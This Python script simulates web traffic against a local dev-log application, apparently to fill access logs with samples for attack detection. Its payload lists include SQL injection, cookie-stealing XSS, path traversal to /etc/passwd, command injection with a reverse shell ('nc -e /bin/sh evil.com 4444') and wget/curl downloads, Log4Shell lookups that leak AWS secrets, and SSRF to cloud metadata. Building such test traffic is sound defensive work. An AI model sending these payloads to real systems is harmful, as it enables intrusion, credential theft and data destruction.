#!/usr/bin/env python3
"""
©AngelaMos | 2026
simulate.py

HTTP traffic simulator for generating realistic attack and
normal log patterns against the dev-log target application

Provides 10 traffic modes via argparse: normal (benign
browsing with GET/POST mix), sqli (12 SQL injection
payloads), xss (10 script/event handler vectors),
traversal (10 dot-dot-slash and encoding variants), cmdi
(7 shell command injection payloads), log4shell (4 JNDI
lookup variants), ssrf (5 cloud metadata and internal
service targets), scanner (20 recon paths with 11 scanner
user-agents), flood (rapid-fire requests), and mixed
(50/10/40 normal/scanner/attack split). Uses urllib for
HTTP requests with configurable count, delay, and target
URL. Checks /health reachability before starting

Connects to:
  dev-log/app.py       - target endpoints
  dev-log/nginx.conf   - requests proxied through nginx
                         to generate access.log entries
"""

import argparse
import random
import sys
import time
import urllib.error
import urllib.request

DEFAULT_TARGET = "http://localhost:58319"

NORMAL_PATHS = [
    "/",
    "/health",
    "/api/users",
    "/api/users/1",
    "/api/users/2",
    "/api/users/3",
    "/api/products",
    "/api/products/1",
    "/api/products/2",
    "/api/search?q=shoes",
    "/api/search?q=electronics",
    "/api/search?q=sale+items",
    "/static/css/main.css",
    "/static/js/app.js",
    "/static/images/logo.png",
]

SQLI_PAYLOADS = [
    "/api/users?id=1' OR '1'='1",
    "/api/users?id=1' OR '1'='1'--",
    "/api/search?q=' UNION SELECT username,password FROM users--",
    "/api/search?q='; DROP TABLE users;--",
    "/api/users?id=1; SELECT * FROM information_schema.tables",
    "/api/login?user=admin'--&pass=x",
    "/api/products?id=1 UNION SELECT null,null,null",
    "/api/search?q=' OR 1=1#",
    "/api/users?id=0 UNION ALL SELECT concat(user,0x3a,password) FROM mysql.user",
    "/api/search?q=1' AND (SELECT COUNT(*) FROM users) > 0--",
    "/api/users?id=1' WAITFOR DELAY '0:0:5'--",
    "/api/products?sort=name; INSERT INTO admin VALUES('hacker','pwned')",
]

XSS_PAYLOADS = [
    "/api/search?q=<script>alert('xss')</script>",
    "/api/search?q=<img src=x onerror=alert(document.cookie)>",
    "/api/search?q=<svg/onload=alert(1)>",
    "/api/search?q=javascript:alert(1)",
    "/api/search?q=<iframe src='javascript:alert(1)'>",
    "/api/search?q=<body onload=alert('xss')>",
    "/api/search?q=\"><script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    "/api/search?q=<input onfocus=alert(1) autofocus>",
    "/api/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
    "/api/users?name=<img src=x onerror=fetch('http://evil.com/'+document.cookie)>",
]

TRAVERSAL_PAYLOADS = [
    "/../../etc/passwd",
    "/static/../../../etc/shadow",
    "/api/../../etc/hosts",
    "/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/static/..\\..\\..\\windows\\system32\\config\\sam",
    "/api/users/../../../proc/self/environ",
    "/static/....//....//....//etc/passwd",
    "/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/static/..%252f..%252f..%252fetc/passwd",
    "/api/download?file=../../../etc/passwd",
]

COMMAND_INJECTION_PAYLOADS = [
    "/api/search?q=;cat /etc/passwd",
    "/api/search?q=|ls -la /",
    "/api/search?q=`whoami`",
    "/api/search?q=$(id)",
    "/api/search?q=;wget http://evil.com/shell.sh",
    "/api/search?q=|nc -e /bin/sh evil.com 4444",
    "/api/users?name=test&&curl evil.com/backdoor",
]

LOG4SHELL_PAYLOADS = [
    "/api/search?q=${jndi:ldap://evil.com/exploit}",
    "/api/search?q=${jndi:rmi://evil.com:1099/obj}",
    "/api/search?q=${${lower:j}ndi:ldap://evil.com/x}",
    "/api/search?q=${jndi:ldap://evil.com/${env:AWS_SECRET_ACCESS_KEY}}",
]

SSRF_PAYLOADS = [
    "/api/search?url=http://169.254.169.254/latest/meta-data/",
    "/api/search?url=http://127.0.0.1:22",
    "/api/search?url=http://10.0.0.1/admin",
    "/api/search?url=http://[::1]/",
    "/api/search?url=http://metadata.google.internal/computeMetadata/v1/",
]

SCANNER_USER_AGENTS = [
    "Nikto/2.1.6",
    "sqlmap/1.7.2#stable (https://sqlmap.org)",
    "Nessus SOAP",
    "DirBuster-1.0-RC1",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
    "WPScan v3.8.25",
    "Acunetix Web Vulnerability Scanner",
    "gobuster/3.6",
    "nuclei (github.com/projectdiscovery/nuclei)",
    "masscan/1.3.2",
    "ZAP/2.14.0",
]

NORMAL_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "curl/8.11.1",
    "python-requests/2.32.3",
]

ATTACK_POOLS = {
    "sqli": SQLI_PAYLOADS,
    "xss": XSS_PAYLOADS,
    "traversal": TRAVERSAL_PAYLOADS,
    "cmdi": COMMAND_INJECTION_PAYLOADS,
    "log4shell": LOG4SHELL_PAYLOADS,
    "ssrf": SSRF_PAYLOADS,
}


def send(target, path, user_agent=None, method="GET"):
    url = f"{target}{path}"
    ua = user_agent or random.choice(NORMAL_USER_AGENTS)
    req = urllib.request.Request(url, headers={"User-Agent": ua})
    if method == "POST":
        req.method = "POST"
        req.data = b'{"username":"test","password":"test"}'
        req.add_header("Content-Type", "application/json")
    try:
        resp = urllib.request.urlopen(req, timeout=5)
        return resp.status
    except urllib.error.HTTPError as e:
        return e.code
    except urllib.error.URLError:
        return 0
    except Exception:
        return 0


def run_normal(target, count, delay):
    print(f"Sending {count} normal requests...")
    methods = ["GET"] * 9 + ["POST"]
    post_paths = ["/api/login", "/api/checkout"]
    for i in range(count):
        method = random.choice(methods)
        if method == "POST":
            path = random.choice(post_paths)
        else:
            path = random.choice(NORMAL_PATHS)
        status = send(target, path, method=method)
        print(f"  [{i + 1}/{count}] {method} {path} -> {status}")
        time.sleep(delay)


def run_attack(target, count, delay, pool_name):
    pool = ATTACK_POOLS[pool_name]
    print(f"Sending {count} {pool_name} attack requests...")
    for i in range(count):
        path = random.choice(pool)
        status = send(target, path)
        print(f"  [{i + 1}/{count}] GET {path} -> {status}")
        time.sleep(delay)


def run_scanner(target, count, delay):
    print(f"Sending {count} scanner-style requests...")
    scan_paths = [
        "/admin",
        "/admin/dashboard",
        "/.env",
        "/wp-admin",
        "/wp-login.php",
        "/.git/config",
        "/phpmyadmin",
        "/server-status",
        "/actuator/env",
        "/.well-known/security.txt",
        "/robots.txt",
        "/sitemap.xml",
        "/api/v1/debug",
        "/console",
        "/swagger.json",
        "/api-docs",
        "/.DS_Store",
        "/backup.sql",
        "/config.yml",
        "/api/users",
    ]
    for i in range(count):
        path = random.choice(scan_paths)
        ua = random.choice(SCANNER_USER_AGENTS)
        status = send(target, path, user_agent=ua)
        print(f"  [{i + 1}/{count}] GET {path} [{ua.split('/')[0]}] -> {status}")
        time.sleep(delay)


def run_flood(target, count, delay):
    print(f"Flooding {count} rapid-fire requests (delay={delay}s)...")
    for i in range(count):
        path = random.choice(NORMAL_PATHS[:5])
        status = send(target, path)
        print(f"  [{i + 1}/{count}] GET {path} -> {status}")
        time.sleep(delay)


def run_mixed(target, count, delay):
    print(f"Sending {count} mixed traffic (normal + attacks)...")
    all_attack_payloads = []
    for pool in ATTACK_POOLS.values():
        all_attack_payloads.extend(pool)

    for i in range(count):
        roll = random.random()
        if roll < 0.5:
            path = random.choice(NORMAL_PATHS)
            ua = random.choice(NORMAL_USER_AGENTS)
            label = "NORMAL"
        elif roll < 0.6:
            path = random.choice(all_attack_payloads)
            ua = random.choice(SCANNER_USER_AGENTS)
            label = "SCANNER"
        else:
            path = random.choice(all_attack_payloads)
            ua = random.choice(NORMAL_USER_AGENTS)
            label = "ATTACK"
        status = send(target, path, user_agent=ua)
        print(f"  [{i + 1}/{count}] [{label:>7}] {path[:80]} -> {status}")
        time.sleep(delay)


MODES = {
    "normal": lambda t, c, d: run_normal(t, c, d),
    "sqli": lambda t, c, d: run_attack(t, c, d, "sqli"),
    "xss": lambda t, c, d: run_attack(t, c, d, "xss"),
    "traversal": lambda t, c, d: run_attack(t, c, d, "traversal"),
    "cmdi": lambda t, c, d: run_attack(t, c, d, "cmdi"),
    "log4shell": lambda t, c, d: run_attack(t, c, d, "log4shell"),
    "ssrf": lambda t, c, d: run_attack(t, c, d, "ssrf"),
    "scanner": lambda t, c, d: run_scanner(t, c, d),
    "flood": lambda t, c, d: run_flood(t, c, d),
    "mixed": lambda t, c, d: run_mixed(t, c, d),
}


def main():
    parser = argparse.ArgumentParser(
        description="Simulate traffic against the dev-log target app"
    )
    parser.add_argument(
        "mode",
        choices=list(MODES.keys()),
        help="Traffic pattern to simulate",
    )
    parser.add_argument(
        "-n", "--count",
        type=int,
        default=50,
        help="Number of requests to send (default: 50)",
    )
    parser.add_argument(
        "-d", "--delay",
        type=float,
        default=0.1,
        help="Delay between requests in seconds (default: 0.1)",
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})",
    )
    args = parser.parse_args()

    test = send(args.target, "/health")
    if test == 0:
        print(f"ERROR: Cannot reach {args.target}/health")
        print("Is the dev-log app running? Try: just devlog-up")
        sys.exit(1)

    MODES[args.mode](args.target, args.count, args.delay)
    print("Done.")


if __name__ == "__main__":
    main()
